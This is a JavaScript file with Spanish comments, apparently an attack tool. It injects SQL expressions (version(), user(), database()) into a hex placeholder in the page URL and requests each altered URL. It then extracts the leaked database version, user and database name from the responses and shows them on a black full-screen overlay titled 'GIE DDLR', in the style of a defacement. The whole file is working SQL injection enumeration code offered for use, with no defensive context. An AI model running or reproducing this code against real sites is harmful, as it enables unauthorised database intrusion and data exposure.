// index.js

// Obtener la URL completa
const urlCompleta = window.location.href;

// Definir la expresión regular para encontrar la cadena ((0x...))
const regex = /\(\(0x[0-9a-fA-F]+\)\)/g;

// Reemplazar la cadena encontrada por "payload"
const urlModificada = urlCompleta.replace(regex, 'payload');

// Reemplazar "payload" por "concat("version=", version())"
const urlConVersion = urlModificada.replace("payload", 'concat("version=\'", version(),"\'")');

// Reemplazar "payload" por "concat("usuario=\'", user(),"\'")"
const urlConUsuario = urlModificada.replace("payload", 'concat("usuario=\'", user(),"\'")');

// Reemplazar "payload" por "concat("basededatos=\'", database(),"\'")"
const urlConBD = urlModificada.replace("payload", 'concat("basededatos=\'", database(),"\'")');

// Imprimir la URL modificada con "version" en la consola
console.log('URL con "version":', urlConVersion);

// Función para aplicar los estilos al título y fondo
function aplicarEstilos() {
  // Crear un elemento div para el fondo negro
  const fondoNegro = document.createElement('div');
  fondoNegro.style.backgroundColor = 'black';
  fondoNegro.style.position = 'fixed';
  fondoNegro.style.top = '0';
  fondoNegro.style.left = '0';
  fondoNegro.style.width = '100%';
  fondoNegro.style.height = '100%';
  fondoNegro.style.zIndex = '9999'; // Asegura que esté por encima de todos los elementos
  document.body.appendChild(fondoNegro);

  // Crear un elemento h1 para el título
  const titulo = document.createElement('h1');
  titulo.textContent = 'GIE DDLR';
  titulo.style.color = 'limegreen';
  titulo.style.fontSize = '36px';
  titulo.style.textAlign = 'center';
  titulo.style.position = 'fixed';
  titulo.style.top = '10%'; // Alineación superior centrada
  titulo.style.left = '50%';
  titulo.style.transform = 'translateX(-50%)';
  titulo.style.zIndex = '10000'; // Asegura que esté por encima de todo
  document.body.appendChild(titulo);
}

// Llamar a la función para aplicar los estilos cuando la página se cargue
window.addEventListener('load', () => {
  aplicarEstilos();
  
  // Realizar una solicitud GET para obtener el HTML con la versión
  fetch(urlConVersion)
    .then(response => response.text())
    .then(html => {
      // Utilizar expresión regular para extraer la versión
      const versionRegex = /version='([^']+)'/;
      const versionMatch = html.match(versionRegex);

      if (versionMatch && versionMatch.length > 1) {
        const versionNumber = versionMatch[1];
        console.log('Versión encontrada:', versionNumber);
        
        // Realizar una solicitud GET para obtener la información del usuario
        fetch(urlConUsuario)
          .then(response => response.text())
          .then(userHtml => {
            // Utilizar expresión regular para extraer la información del usuario
            const userRegex = /usuario='([^']+)'/;
            const userMatch = userHtml.match(userRegex);

            if (userMatch && userMatch.length > 1) {
              const userInfo = userMatch[1];
              console.log('Información de usuario:', userInfo);

              // Realizar una solicitud GET para obtener la información de la base de datos
              fetch(urlConBD)
                .then(response => response.text())
                .then(dbHtml => {
                  // Utilizar expresión regular para extraer la información de la base de datos
                  const dbRegex = /basededatos='([^']+)'/;
                  const dbMatch = dbHtml.match(dbRegex);

                  if (dbMatch && dbMatch.length > 1) {
                    const dbInfo = dbMatch[1];
                    console.log('Información de base de datos:', dbInfo);

                    // Mostrar los elementos en una sola línea separados por "|"
                    const combinedInfo = `Versión: ${versionNumber} | Usuario: ${userInfo} | Base de Datos: ${dbInfo}`;
                    const combinedInfoElement = document.createElement('p');
                    combinedInfoElement.textContent = combinedInfo;
                    combinedInfoElement.style.color = 'white';
                    combinedInfoElement.style.fontSize = '20px';
                    combinedInfoElement.style.textAlign = 'center';
                    combinedInfoElement.style.position = 'fixed';
                    combinedInfoElement.style.top = '30%'; // Alineación superior centrada
                    combinedInfoElement.style.left = '50%';
                    combinedInfoElement.style.transform = 'translateX(-50%)';
                    combinedInfoElement.style.zIndex = '10000'; // Asegura que esté por encima de todo
                    document.body.appendChild(combinedInfoElement);
                  } else {
                    console.log('Información de base de datos no encontrada.');
                  }
                })
                .catch(error => {
                  console.error('Error al obtener la información de base de datos:', error);
                });
            } else {
              console.log('Información de usuario no encontrada.');
            }
          })
          .catch(error => {
            console.error('Error al obtener la información de usuario:', error);
          });
      } else {
        console.log('Versión no encontrada.');
      }
    })
    .catch(error => {
      console.error('Error al obtener el HTML:', error);
    });
});
